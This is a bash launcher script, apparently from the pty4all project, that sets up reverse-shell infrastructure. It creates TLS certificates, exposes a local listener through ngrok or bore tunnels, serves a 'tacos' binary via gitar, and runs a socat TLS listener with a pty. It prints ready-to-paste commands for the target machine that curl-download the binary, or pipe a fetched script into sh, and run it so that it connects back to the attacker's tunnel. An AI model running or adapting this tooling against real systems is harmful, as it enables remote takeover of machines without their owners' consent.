#!/bin/bash

# From https://github.com/laluka/pty4all

SHORTCUT=true

for i in "$@"; do
    case $i in
    --lport|-p)
        LPORT="$2"
        shift;shift;
        ;;
    --webport)
        WEBPORT="$2"
        shift;shift;
        ;;
    --bore)
        BORE=true
        shift;shift;
        ;;
    --windows|-w)
        WINDOWS=true
        ;;
    --no-shortcuts|-N)
        SHORTCUT="" # ~ setting at false
        ;;
    --help|-h)
        HELP=true
        ;;
    *)    
        ;;
    esac
done

# Default value + envvar
SCRIPTNAME=$(readlink -f "$0")
BASEDIR=$(dirname "$SCRIPTNAME")


if [[ -z "$LPORT" ]];
then
    LPORT=4444
fi

if [[ -z "$WEBPORT" ]];
then
    WEBPORT=9292
fi

if [[ "$HELP" ]];
then
    echo "Usage : $0 -p <socat_port>";
    echo -e "\t--ngrok to perform tunneling usi,ng ngrok instead of bore"
    echo -e "\t-w/--windows if target is a winows machine"
    echo -e "\t-p/--lport for the socat listener local port"
    echo -e "\t--web-port for the gitar lcoal port"
    echo -e "\nUse this script with caution when you want to expose your listener behind an internet facing endpoint"
    exit 92
fi

if [[ -z "${TMUX}" ]]; then
    echo "Must be run in tmux"
    exit 92
fi

if [[ "$WINDOWS" ]]; then
    BINARY="tacos.exe"
    SCRIPT=$BASEDIR"/socat-forker-windows.sh"
else
    BINARY="tacos"
    SCRIPT=$BASEDIR"/socat-forker.sh"
fi

# TLS part
echo -e "\n\n\n[+] Generating tls certs and keys"
if [ -f server.pem ]; then
    echo "[+] Files already exist, using server.pem"
else
    rm server.key server.crt server.pem
    yes "" | openssl req -newkey rsa:2048 -nodes -keyout server.key -x509 -days 30 -out server.crt
    cat server.key server.crt >server.pem
fi

cp ${SCRIPT}.tpl ${SCRIPT}

# Tunneling launching
TUNNEL_ENDPOINT=""
if [[ $BORE ]]; then
    ## launch bore
    TEAL='\033[1;36m'
    NC='\033[0m' # No Color
    echo "[+] Launch bore tunneling"
    tmux split-window -v "bore local ${WEBPORT} --to bore.pub"
    printf "${TEAL}please enter bore.pub remote_port given? ${NC}"
    read BPORT
    BORE_ENDPOINT="bore.pub:${BPORT}"
    TUNNEL_ENDPOINT="${BORE_ENDPOINT}"
else
    ## launch ngrok
    echo "[+] Launch ngrok tunneling"
    tmux split-window -v "ngrok tcp ${WEBPORT}"
    sleep 4 # wait for ngrok to start
    NGROK_ENDPOINT_TCP=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels | jq -r ".tunnels[0].public_url")
    # NGROK_ENDPOINT="http:$(echo $NGROK_ENDPOINT_TCP | cut -d ":" -f 2-3)"
    NGROK_ENDPOINT="$(echo $NGROK_ENDPOINT_TCP | cut -d ':' -f 2-3 | cut -d '/' -f 3-)"
    TUNNEL_ENDPOINT="${NGROK_ENDPOINT}"
fi

#launch gitar
echo "[+] launch gitar server"
SECRET=$RANDOM
tmux split-window -h "gitar -a https://${TUNNEL_ENDPOINT} -f ${LPORT} --secret ${SECRET}"   # https??
URL="http://${TUNNEL_ENDPOINT}/${SECRET}"

## gitar shortcut are not possible as we will call shutdown on gitar (=> no more http server)
# disable gitar shortcut
sed -i "/GITAR_SECRET/d" ${SCRIPT}
# if [[ ! $WINDOWS ]]; then
#     echo "[+] gitar shortcuts enabled on reverse shell"
#     sed -i "s/GITAR_PORT/${WEBPORT}/g" ${SCRIPT}
#     URL_WITHOUT_SLASH=$(echo "$URL" | tr / ~)
#     sed -i "s,GITAR_HOST,${URL},g" ${SCRIPT}  #Fix, I need -a and not -e    # Use another delimeter for sed to have / in url
# fi

# put tacos in current directory
PWD=$(pwd)
if [[ -f "./$BINARY" ]];then
    echo "[+] ${BINARY} is already in ${PWD}"
else
    RED='\033[1;31m'
    NC='\033[0m' # No Color
    printf "${RED}[*] Put ${BINARY} in ${PWD} before launching reverse shell process${NC}\n"

fi

# message/output
echo "[+] Copy/paste following command on target and enjoy your meal 🌮:"

DOWNLOAD_URL="${URL}/pull/${BINARY}"
SHUTDOWN_URL="${URL}/shutdown"


# LISTEN
REMOTE_CMD=""

if [[ "$WINDOWS" ]]; then
    REMOTE_CMD="curl -O $DOWNLOAD_URL &&  curl $SHUTDOWN_URL && .\\${BINARY} ${TUNNEL_ENDPOINT}"
else
    REMOTE_CMD="curl -s -O $DOWNLOAD_URL &&  curl $SHUTDOWN_URL && chmod +x ${BINARY} && ./${BINARY} ${TUNNEL_ENDPOINT}"
fi

## with shorter shortcut?
if [[ "$SHORTCUT" ]]; then
    ## Write file for gitar
    echo "${REMOTE_CMD}" > sh
    SHORTCUT_URL="${URL}/pull/sh"
    REMOTE_CMD="\nsh -c \"\$(curl ${SHORTCUT_URL})\"\nsh <(curl ${SHORTCUT_URL})"
    #curl ${SHORTCUT_URL} |sh\n does not work due to /pkg/tacos/tacos.go:94
fi

echo
if [[ "$WINDOWS" ]]; then
    echo -e "(🪟) ${REMOTE_CMD}"
    socat OPENSSL-LISTEN:${LPORT},cert=server.pem,verify=0,reuseaddr,fork EXEC:${SCRIPT},pty
else
    echo -e "(🐧) ${REMOTE_CMD}"
    socat OPENSSL-LISTEN:${LPORT},cert=server.pem,verify=0,reuseaddr,fork EXEC:${SCRIPT},pty,raw,echo=0
fi
